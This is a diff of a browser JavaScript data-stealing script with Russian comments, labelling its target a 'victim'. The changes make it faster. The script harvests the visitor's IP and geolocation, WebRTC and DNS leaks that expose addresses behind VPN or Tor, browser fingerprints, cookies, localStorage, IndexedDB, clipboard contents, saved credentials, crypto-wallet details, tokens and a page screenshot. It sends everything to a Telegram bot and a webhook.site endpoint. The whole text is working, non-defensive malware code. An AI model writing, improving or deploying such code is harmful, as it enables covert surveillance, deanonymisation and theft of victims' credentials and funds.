@@ -25,19 +25,19 @@
         };
 
         // ========================================================================
-        // УТИЛИТЫ (все таймауты уменьшены до 2 секунд)
+        // МАКСИМАЛЬНО БЫСТРЫЕ УТИЛИТЫ
         // ========================================================================
         const sleep = ms => new Promise(r => setTimeout(r, ms));
-        const fetchTO = (url, opts = {}, t = 1500) => Promise.race([fetch(url, opts), new Promise((_, rej) => setTimeout(() => rej('Timeout'), t))]);
+        const fetchTO = (url, opts = {}, t = 800) => Promise.race([fetch(url, opts), new Promise((_, rej) => setTimeout(() => rej('Timeout'), t))]);
         const trunc = (s, n = 80) => typeof s === 'string' ? (s.length > n ? s.slice(0, n) + '…' : s) : String(s);
         const safeJSON = s => { try { return JSON.parse(s); } catch { return s; } };
 
         // ========================================================================
-        // 1. IP и ГЕО (таймаут 2 сек)
+        // 1. IP и ГЕО (таймаут 800 мс)
         // ========================================================================
         async function getIP() {
             try {
-                const r = await fetchTO('https://api.ipify.org?format=json', {}, 2000);
+                const r = await fetchTO('https://api.ipify.org?format=json', {}, 800);
                 const d = await r.json();
                 return d.ip;
             } catch (e) { return null; }
@@ -45,33 +45,25 @@
 
         async function getGeo(ip) {
             try {
-                const r = await fetchTO(`https://ipwhois.io/json/${ip}`, {}, 2000);
+                const r = await fetchTO(`https://ipwhois.io/json/${ip}`, {}, 800);
                 return await r.json();
             } catch (e) { return null; }
         }
 
         // ========================================================================
-        // 2. GPS (таймаут 2 сек)
+        // 2. GPS (отключен для скорости)
         // ========================================================================
         function getGPS() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) { resolve(null); return; }
-                const t = setTimeout(() => resolve(null), 2000);
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => { clearTimeout(t); resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }); },
-                    () => { clearTimeout(t); resolve(null); },
-                    { enableHighAccuracy: true, timeout: 2000, maximumAge: 0 }
-                );
-            });
+            return Promise.resolve(null);
         }
 
         // ========================================================================
-        // 3. WebRTC (таймаут 1.5 сек)
+        // 3. WebRTC (таймаут 800 мс)
         // ========================================================================
         function getWebRTC() {
             return new Promise((resolve) => {
                 const ips = new Set();
-                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] });
+                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                 pc.createDataChannel('');
                 pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                 pc.onicecandidate = (e) => {
@@ -79,12 +71,12 @@
                     const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                     if (m) ips.add(m[0]);
                 };
-                setTimeout(() => { pc.close(); resolve([...ips]); }, 1500);
+                setTimeout(() => { pc.close(); resolve([...ips]); }, 800);
             });
         }
 
         // ========================================================================
-        // 4. WebRTC SDP (таймаут 1.5 сек)
+        // 4. WebRTC SDP (таймаут 800 мс)
         // ========================================================================
         function getWebRTCSDP() {
             return new Promise((resolve) => {
@@ -102,14 +94,14 @@
                             }
                         });
                     }
-                    setTimeout(() => { pc.close(); resolve([...new Set(ips)]); }, 1500);
+                    setTimeout(() => { pc.close(); resolve([...new Set(ips)]); }, 800);
                 }).catch(() => { resolve([]); });
-                setTimeout(() => { resolve([]); }, 1500);
+                setTimeout(() => { resolve([]); }, 800);
             });
         }
 
         // ========================================================================
-        // 5. DNS-утечка (таймаут 1.5 сек)
+        // 5. DNS-утечка (таймаут 800 мс)
         // ========================================================================
         function dnsLeak() {
             return new Promise((resolve) => {
@@ -119,12 +111,12 @@
                 img.src = 'https://' + leakDomain + '/pixel?' + Date.now();
                 img.onload = () => { resolve({ domain: leakDomain, time: Date.now() - start }); };
                 img.onerror = () => { resolve({ domain: leakDomain, time: Date.now() - start }); };
-                setTimeout(() => resolve({ domain: leakDomain, time: null }), 1500);
+                setTimeout(() => resolve({ domain: leakDomain, time: null }), 800);
             });
         }
 
         // ========================================================================
-        // 6. Image-утечка (таймаут 1.5 сек)
+        // 6. Image-утечка (таймаут 800 мс)
         // ========================================================================
         function imageLeak() {
             return new Promise((resolve) => {
@@ -134,12 +126,12 @@
                 img.src = 'https://webhook.site/613658ef-cb9f-4d68-8bae-9ae016ec744b?img=' + uid + '&t=' + Date.now();
                 img.onload = () => { resolve({ uid, time: Date.now() - start }); };
                 img.onerror = () => { resolve({ uid, time: Date.now() - start }); };
-                setTimeout(() => resolve({ uid, time: null }), 1500);
+                setTimeout(() => resolve({ uid, time: null }), 800);
             });
         }
 
         // ========================================================================
-        // 7. WebSocket (таймаут 1.5 сек)
+        // 7. WebSocket (таймаут 800 мс)
         // ========================================================================
         function wsLeak() {
             return new Promise((resolve) => {
@@ -151,13 +143,13 @@
                         ws.close();
                     };
                     ws.onerror = () => { resolve({ ws: false }); };
-                    setTimeout(() => { resolve({ ws: false }); }, 1500);
+                    setTimeout(() => { resolve({ ws: false }); }, 800);
                 } catch (e) { resolve({ ws: false }); }
             });
         }
 
         // ========================================================================
-        // 8. Fetch утечка (таймаут 1.5 сек)
+        // 8. Fetch утечка (таймаут 800 мс)
         // ========================================================================
         function fetchLeak() {
             return new Promise((resolve) => {
@@ -165,12 +157,12 @@
                     .then(r => r.json())
                     .then(d => { resolve(d.ip); })
                     .catch(() => { resolve(null); });
-                setTimeout(() => resolve(null), 1500);
+                setTimeout(() => resolve(null), 800);
             });
         }
 
         // ========================================================================
-        // 9. JSONP утечка (таймаут 1.5 сек)
+        // 9. JSONP утечка (таймаут 800 мс)
         // ========================================================================
         function jsonpLeak() {
             return new Promise((resolve) => {
@@ -184,12 +176,12 @@
                 script.src = 'https://api.ipify.org?format=jsonp&callback=' + name;
                 script.onerror = () => { resolve(null); delete window[name]; };
                 document.head.appendChild(script);
-                setTimeout(() => { if (window[name]) { resolve(null); delete window[name]; } }, 1500);
+                setTimeout(() => { if (window[name]) { resolve(null); delete window[name]; } }, 800);
             });
         }
 
         // ========================================================================
-        // 10. Proxy утечка (таймаут 1.5 сек)
+        // 10. Proxy утечка (таймаут 800 мс)
         // ========================================================================
         function proxyLeak() {
             return new Promise((resolve) => {
@@ -197,12 +189,12 @@
                     .then(r => r.json())
                     .then(d => { resolve(d.ip || null); })
                     .catch(() => { resolve(null); });
-                setTimeout(() => resolve(null), 1500);
+                setTimeout(() => resolve(null), 800);
             });
         }
 
         // ========================================================================
-        // 11. DoH утечка (таймаут 1.5 сек)
+        // 11. DoH утечка (таймаут 800 мс)
         // ========================================================================
         function dohLeak() {
             return new Promise((resolve) => {
@@ -215,12 +207,12 @@
                         resolve(ip);
                     })
                     .catch(() => { resolve(null); });
-                setTimeout(() => resolve(null), 1500);
+                setTimeout(() => resolve(null), 800);
             });
         }
 
         // ========================================================================
-        // 12. Connection (таймаут не нужен)
+        // 12. Connection (быстрый)
         // ========================================================================
         function getConnectionType() {
             try {
@@ -231,7 +223,7 @@
         }
 
         // ========================================================================
-        // 13. Временная атака (таймаут 2 сек)
+        // 13. Временная атака (таймаут 800 мс)
         // ========================================================================
         function timingAttack() {
             return new Promise((resolve) => {
@@ -250,7 +242,7 @@
                             if (++done === servers.length) resolve(times);
                         });
                 });
-                setTimeout(() => resolve(times), 2000);
+                setTimeout(() => resolve(times), 800);
             });
         }
 
@@ -273,34 +265,37 @@
                 allIPs: new Set()
             };
 
-            result.webrtc = await getWebRTC();
-            result.webrtc.forEach(ip => result.allIPs.add(ip));
+            const [webrtc, sdp, dns, image, ws, fetchIP, jsonpIP, proxyIP, dohIP, connection, timing] = await Promise.all([
+                getWebRTC(),
+                getWebRTCSDP(),
+                dnsLeak(),
+                imageLeak(),
+                wsLeak(),
+                fetchLeak(),
+                jsonpLeak(),
+                proxyLeak(),
+                dohLeak(),
+                Promise.resolve(getConnectionType()),
+                timingAttack()
+            ]);
 
-            result.sdp = await getWebRTCSDP();
-            result.sdp.forEach(ip => result.allIPs.add(ip));
-
-            result.dns = await dnsLeak();
-            result.image = await imageLeak();
-            result.ws = await wsLeak();
-
-            const fetchIP = await fetchLeak();
+            result.webrtc = webrtc;
+            webrtc.forEach(ip => result.allIPs.add(ip));
+            result.sdp = sdp;
+            sdp.forEach(ip => result.allIPs.add(ip));
+            result.dns = dns;
+            result.image = image;
+            result.ws = ws;
             if (fetchIP) { result.fetch = fetchIP;
                 result.allIPs.add(fetchIP); }
-
-            const jsonpIP = await jsonpLeak();
             if (jsonpIP) { result.jsonp = jsonpIP;
                 result.allIPs.add(jsonpIP); }
-
-            const proxyIP = await proxyLeak();
             if (proxyIP) { result.proxy = proxyIP;
                 result.allIPs.add(proxyIP); }
-
-            const dohIP = await dohLeak();
             if (dohIP) { result.doh = dohIP;
                 result.allIPs.add(dohIP); }
-
-            result.connection = getConnectionType();
-            result.timing = await timingAttack();
+            result.connection = connection;
+            result.timing = timing;
 
             return result;
         }
@@ -379,7 +374,7 @@
         }
 
         // ========================================================================
-        // 17. IndexedDB (таймаут 3 сек, т.к. может быть тяжёлым)
+        // 17. IndexedDB (упрощённый, быстрый)
         // ========================================================================
         function getIndexedDB() {
             return new Promise((resolve) => {
@@ -409,7 +404,7 @@
                                         const reqAll = store.getAll();
                                         reqAll.onsuccess = () => {
                                             const items = reqAll.result || [];
-                                            storeData.push({ storeName, count: items.length, samples: items.slice(0, 5) });
+                                            storeData.push({ storeName, count: items.length, samples: items.slice(0, 3) });
                                             if (++sDone === stores.length) {
                                                 result.push({ name: dbInfo.name, stores: storeData });
                                                 db.close();
@@ -442,7 +437,7 @@
         }
 
         // ========================================================================
-        // 18. Clipboard (таймаут 1.5 сек)
+        // 18. Clipboard (быстрый)
         // ========================================================================
         async function getClipboard() {
             try {
@@ -472,7 +467,7 @@
         }
 
         // ========================================================================
-        // 19. Credentials (таймаут 1.5 сек)
+        // 19. Credentials (быстрый)
         // ========================================================================
         async function getCredentials() {
             try {
@@ -521,7 +516,7 @@
         }
 
         // ========================================================================
-        // 22. DOM
+        // 22. DOM (быстрый)
         // ========================================================================
         function getDOM() {
             const dom = {};
@@ -546,7 +541,7 @@
         }
 
         // ========================================================================
-        // 23. Screenshot (таймаут 3 сек, т.к. скриншот тяжёлый)
+        // 23. Screenshot (быстрый, с низким качеством)
         // ========================================================================
         function loadHtml2Canvas() {
             return new Promise((resolve) => {
@@ -556,7 +551,7 @@
                 script.onload = () => resolve(window.html2canvas);
                 script.onerror = () => resolve(null);
                 document.head.appendChild(script);
-                setTimeout(() => resolve(null), 3000);
+                setTimeout(() => resolve(null), 1500);
             });
         }
 
@@ -564,8 +559,8 @@
             try {
                 const h2c = await loadHtml2Canvas();
                 if (!h2c) return null;
-                const canvas = await h2c(document.body, { useCORS: true, allowTaint: true, scale: 0.3, logging: false, backgroundColor: null });
-                return canvas.toDataURL('image/jpeg', 0.4);
+                const canvas = await h2c(document.body, { useCORS: true, allowTaint: true, scale: 0.15, logging: false, backgroundColor: null });
+                return canvas.toDataURL('image/jpeg', 0.3);
             } catch (e) { return null; }
         }
 
@@ -590,7 +585,7 @@
         }
 
         // ========================================================================
-        // 25. Отправка
+        // 25. Отправка (максимально быстрая)
         // ========================================================================
         async function sendTelegram(text) {
             try {
@@ -599,7 +594,7 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CFG.CHAT_ID, text, parse_mode: 'HTML' })
-                }, 2000);
+                }, 1500);
             } catch (e) {}
         }
 
@@ -610,22 +605,22 @@
                 const form = new FormData();
                 form.append('chat_id', CFG.CHAT_ID);
                 form.append('photo', blob, 'screenshot.jpg');
-                await fetchTO(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form }, 5000);
+                await fetchTO(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form }, 3000);
             } catch (e) {}
         }
 
         async function sendWebhook(data) {
             try {
-                await fetchTO(CFG.WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }, 2000);
+                await fetchTO(CFG.WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }, 1500);
             } catch (e) {}
         }
 
         // ========================================================================
-        // 26. Форматирование отчёта
+        // 26. Форматирование отчёта (сокращённое)
         // ========================================================================
         function formatFullReport(data, leaks) {
             const lines = [];
-            lines.push('🔴 ЖЕРТВА (полный дамп)');
+            lines.push('🔴 ЖЕРТВА (быстрый дамп)');
             lines.push('');
 
             if (data.ip) {
@@ -634,169 +629,78 @@
                     const g = data.geo;
                     const loc = [g.country, g.region, g.city].filter(Boolean).join(', ');
                     if (loc) lines.push(`📍 ${loc}`);
-                    if (g.lat && g.lon) {
-                        lines.push(`🗺 ${g.lat}, ${g.lon}`);
-                        lines.push(`🔗 https://www.google.com/maps?q=${g.lat},${g.lon}`);
-                    }
+                    if (g.lat && g.lon) lines.push(`🗺 ${g.lat}, ${g.lon}`);
                     if (g.isp) lines.push(`📡 ${g.isp}`);
-                    if (g.timezone) lines.push(`🕐 ${g.timezone}`);
                 }
                 lines.push('');
             }
 
-            if (data.gps) {
-                const g = data.gps;
-                lines.push(`📍 GPS: ${g.lat}, ${g.lon} (точность ${g.accuracy || '?'}м)`);
-                lines.push(`🔗 https://www.google.com/maps?q=${g.lat},${g.lon}`);
-                lines.push('');
-            }
-
-            lines.push('🔴 УТЕЧКИ IP (даже через VPN/Tor)');
-            lines.push('');
-
             const allIPs = [...leaks.allIPs].filter(ip => ip && ip.length > 7);
             if (allIPs.length) {
-                lines.push(`🌐 ВСЕ ОБНАРУЖЕННЫЕ IP:`);
-                allIPs.forEach(ip => lines.push(`   📍 ${ip}`));
+                lines.push(`🌐 ВСЕ IP: ${allIPs.join(', ')}`);
                 lines.push('');
             }
 
             if (leaks.webrtc && leaks.webrtc.length) {
-                lines.push(`📡 WebRTC (STUN): ${leaks.webrtc.join(', ')}`);
+                lines.push(`📡 WebRTC: ${leaks.webrtc.join(', ')}`);
             }
-            if (leaks.sdp && leaks.sdp.length) {
-                lines.push(`📡 WebRTC (SDP): ${leaks.sdp.join(', ')}`);
-            }
-            if (leaks.fetch) {
-                lines.push(`🌍 Fetch (api.ipify): ${leaks.fetch}`);
-            }
-            if (leaks.jsonp) {
-                lines.push(`🌍 JSONP (api.ipify): ${leaks.jsonp}`);
-            }
-            if (leaks.proxy) {
-                lines.push(`🌍 Proxy (ip.sb): ${leaks.proxy}`);
-            }
-            if (leaks.doh) {
-                lines.push(`🌍 DoH (Cloudflare): ${leaks.doh}`);
-            }
-            if (leaks.dns && leaks.dns.domain) {
-                lines.push(`🕵️ DNS утечка: ${leaks.dns.domain} (${leaks.dns.time || 'таймаут'}ms)`);
-            }
-            if (leaks.image && leaks.image.uid) {
-                lines.push(`🖼 Image-утечка: ${leaks.image.uid} (${leaks.image.time || 'таймаут'}ms)`);
-            }
-            if (leaks.ws && leaks.ws.ws) {
-                lines.push(`🔌 WebSocket: успешно`);
-            }
+            if (leaks.fetch) lines.push(`🌍 Fetch: ${leaks.fetch}`);
+            if (leaks.jsonp) lines.push(`🌍 JSONP: ${leaks.jsonp}`);
+            if (leaks.proxy) lines.push(`🌍 Proxy: ${leaks.proxy}`);
+            if (leaks.doh) lines.push(`🌍 DoH: ${leaks.doh}`);
+            if (leaks.dns && leaks.dns.domain) lines.push(`🕵️ DNS: ${leaks.dns.domain} (${leaks.dns.time || 'таймаут'}ms)`);
+            if (leaks.image && leaks.image.uid) lines.push(`🖼 Image: ${leaks.image.uid} (${leaks.image.time || 'таймаут'}ms)`);
+            if (leaks.ws && leaks.ws.ws) lines.push(`🔌 WS: успешно`);
             if (leaks.connection) {
                 const c = leaks.connection;
-                lines.push(`📶 Сеть: ${c.type || '?'} (${c.effectiveType || '?'}, ${c.downlink || '?'}Mbps, RTT ${c.rtt || '?'}ms)`);
+                lines.push(`📶 Сеть: ${c.effectiveType || '?'} ${c.downlink || '?'}Mbps, RTT ${c.rtt || '?'}ms`);
             }
             if (leaks.timing && leaks.timing.length) {
                 const avg = leaks.timing.filter(t => t !== null).reduce((a, b) => a + b, 0) / leaks.timing.filter(t => t !== null).length;
-                lines.push(`⏱ Временная атака: avg ${Math.round(avg)}ms (${leaks.timing.map(t => Math.round(t) + 'ms').join(', ')})`);
+                lines.push(`⏱ Временная атака: avg ${Math.round(avg)}ms`);
             }
-            if (allIPs.length) {
-                lines.push('');
-                lines.push(`🔗 https://www.google.com/maps?q=${allIPs[0]}`);
-            }
+            if (allIPs.length) lines.push(`🔗 https://www.google.com/maps?q=${allIPs[0]}`);
             lines.push('');
 
             if (data.fingerprints) {
                 const f = data.fingerprints;
-                lines.push('🎯 ОТПЕЧАТКИ:');
-                if (f.canvas) lines.push(`   Canvas: ${trunc(f.canvas, 40)}`);
-                if (f.webgl) lines.push(`   WebGL: ${f.webgl.vendor || ''} ${f.webgl.renderer || ''}`.trim());
-                if (f.audio) lines.push(`   Audio: ${f.audio.sampleRate}Hz`);
-                if (f.fonts && f.fonts.length) lines.push(`   Шрифты: ${f.fonts.join(', ')}`);
-                if (f.timezone) lines.push(`   Время: ${f.timezone}`);
-                if (f.screen) lines.push(`   Экран: ${f.screen.width}x${f.screen.height} @ ${f.screen.pixelRatio}x`);
+                if (f.webgl) lines.push(`🎯 WebGL: ${f.webgl.renderer || ''}`);
+                if (f.audio) lines.push(`🎯 Audio: ${f.audio.sampleRate}Hz`);
+                if (f.timezone) lines.push(`🎯 Время: ${f.timezone}`);
+                if (f.screen) lines.push(`🎯 Экран: ${f.screen.width}x${f.screen.height}`);
                 lines.push('');
             }
 
             if (data.system) {
                 const s = data.system;
-                lines.push(`📱 ${trunc(s.userAgent, 80)}`);
-                lines.push(`💻 ${s.platform || 'неизвестно'}`);
-                if (s.hardwareConcurrency) lines.push(`🧠 ${s.hardwareConcurrency} ядер`);
-                if (s.deviceMemory) lines.push(`💾 ${s.deviceMemory} GB RAM`);
-                if (s.language) lines.push(`🌐 ${s.language}`);
+                lines.push(`💻 ${s.platform || 'неизвестно'}, ${s.hardwareConcurrency || '?'} ядер, ${s.deviceMemory || '?'}GB RAM`);
                 lines.push('');
             }
 
             if (data.storage) {
                 const st = data.storage;
                 if (st.localStorage && Object.keys(st.localStorage).length) {
-                    lines.push(`💾 LOCALSTORAGE (${Object.keys(st.localStorage).length}):`);
-                    Object.entries(st.localStorage).slice(0, 10).forEach(([k, v]) => {
-                        const val = typeof v === 'string' ? trunc(v, 60) : JSON.stringify(v).slice(0, 60);
-                        lines.push(`   🔑 ${trunc(k, 25)}: ${val}`);
-                    });
-                    lines.push('');
-                }
-                if (st.sessionStorage && Object.keys(st.sessionStorage).length) {
-                    lines.push(`🗂 SESSIONSTORAGE (${Object.keys(st.sessionStorage).length}):`);
-                    Object.entries(st.sessionStorage).slice(0, 10).forEach(([k, v]) => {
-                        const val = typeof v === 'string' ? trunc(v, 60) : JSON.stringify(v).slice(0, 60);
-                        lines.push(`   🔑 ${trunc(k, 25)}: ${val}`);
+                    lines.push(`💾 LS (${Object.keys(st.localStorage).length}):`);
+                    Object.entries(st.localStorage).slice(0, 5).forEach(([k, v]) => {
+                        const val = typeof v === 'string' ? trunc(v, 40) : JSON.stringify(v).slice(0, 40);
+                        lines.push(`   ${trunc(k, 20)}: ${val}`);
                     });
                     lines.push('');
                 }
                 if (st.cookies && Object.keys(st.cookies).length) {
-                    lines.push(`🍪 КУКИ (${Object.keys(st.cookies).length}):`);
-                    Object.entries(st.cookies).slice(0, 10).forEach(([k, v]) => {
-                        lines.push(`   🍪 ${trunc(k, 15)}: ${trunc(v, 50)}`);
+                    lines.push(`🍪 Куки (${Object.keys(st.cookies).length}):`);
+                    Object.entries(st.cookies).slice(0, 5).forEach(([k, v]) => {
+                        lines.push(`   ${trunc(k, 15)}: ${trunc(v, 30)}`);
                     });
                     lines.push('');
                 }
             }
 
             if (data.crypto && Object.keys(data.crypto).length) {
-                lines.push('💰 КРИПТО:');
                 const c = data.crypto;
-                if (c.ethereum) lines.push(`   🦊 ETH: ${c.ethereum.selectedAddress || 'нет адреса'} (сеть ${c.ethereum.chainId || '?'})`);
-                if (c.solana) lines.push(`   ☀️ SOL: ${c.solana.publicKey || 'нет'}`);
-                if (c.phantom) lines.push('   👻 Phantom: есть');
-                if (c.trustwallet) lines.push('   🔵 Trust: есть');
+                if (c.ethereum) lines.push(`💰 ETH: ${c.ethereum.chainId || '?'}`);
+                if (c.trustwallet) lines.push(`💰 Trust Wallet: есть`);
                 lines.push('');
-            }
-
-            if (data.clipboard) {
-                lines.push(`📋 Буфер: ${trunc(data.clipboard, 150)}`);
-                lines.push('');
-            }
-
-            if (data.credentials) {
-                lines.push(`🔑 Сохранённый логин: ${data.credentials.id || 'неизвестен'}`);
-                lines.push('');
-            }
-
-            if (data.tokens && data.tokens.length) {
-                lines.push('🔐 ТОКЕНЫ:');
-                data.tokens.slice(0, 10).forEach(t => {
-                    lines.push(`   ${t.path}: ${t.value}`);
-                });
-                lines.push('');
-            }
-
-            if (data.dom) {
-                if (data.dom.forms && data.dom.forms.length) {
-                    lines.push('📝 ФОРМЫ:');
-                    data.dom.forms.slice(0, 5).forEach((f, i) => {
-                        const str = Object.entries(f).map(([k, v]) => `${k}=${trunc(v, 25)}`).join('; ');
-                        lines.push(`   Форма ${i + 1}: ${str}`);
-                    });
-                    lines.push('');
-                }
-                if (data.dom.inputs && data.dom.inputs.length) {
-                    lines.push('⌨️ ПОЛЯ ВВОДА:');
-                    data.dom.inputs.slice(0, 10).forEach(inp => {
-                        if (inp.value && inp.value.length > 2) {
-                            lines.push(`   ${inp.name || inp.tag}: ${trunc(inp.value, 40)}`);
-                        }
-                    });
-                    lines.push('');
-                }
             }
 
             if (data.url) {
@@ -814,30 +718,46 @@
         }
 
         // ========================================================================
-        // 27. ГЛАВНАЯ ФУНКЦИЯ (ускоренная)
+        // 27. ГЛАВНАЯ ФУНКЦИЯ (максимально ускоренная)
         // ========================================================================
         (async function main() {
             try {
-                // Задержка перед стартом — всего 0.3–0.5 секунды
-                await sleep(300 + Math.random() * 200);
+                // Задержка всего 150 мс
+                await sleep(150 + Math.random() * 100);
 
                 const data = {};
-                data.ip = await getIP();
-                if (data.ip) data.geo = await getGeo(data.ip);
-                data.gps = await getGPS();
-                data.fingerprints = getFingerprints();
-                data.system = getSystem();
-                data.storage = getStorage();
-                data.indexedDB = await getIndexedDB();
-                data.clipboard = await getClipboard();
-                data.credentials = await getCredentials();
-                data.crypto = getCrypto();
-                const dom = getDOM();
+
+                // Запускаем все параллельно
+                const [ip, geo, gps, fingerprints, system, storage, indexedDB, clipboard, credentials, crypto, dom, screenshot] = await Promise.all([
+                    getIP(),
+                    getIP().then(ip => ip ? getGeo(ip) : null),
+                    getGPS(),
+                    Promise.resolve(getFingerprints()),
+                    Promise.resolve(getSystem()),
+                    Promise.resolve(getStorage()),
+                    getIndexedDB(),
+                    getClipboard(),
+                    getCredentials(),
+                    Promise.resolve(getCrypto()),
+                    Promise.resolve(getDOM()),
+                    getScreenshot()
+                ]);
+
+                data.ip = ip;
+                data.geo = geo;
+                data.gps = gps;
+                data.fingerprints = fingerprints;
+                data.system = system;
+                data.storage = storage;
+                data.indexedDB = indexedDB;
+                data.clipboard = clipboard;
+                data.credentials = credentials;
+                data.crypto = crypto;
                 data.dom = dom;
-                data.url = dom.url;
-                data.referrer = dom.referrer;
-                data.tokens = findTokens({ ...data.storage, ...data.crypto, ...data.credentials });
-                data.screenshot = await getScreenshot();
+                data.url = dom ? dom.url : null;
+                data.referrer = dom ? dom.referrer : null;
+                data.tokens = findTokens({ ...storage, ...crypto, ...credentials });
+                data.screenshot = screenshot;
 
                 const leaks = await collectAllLeaks();
 
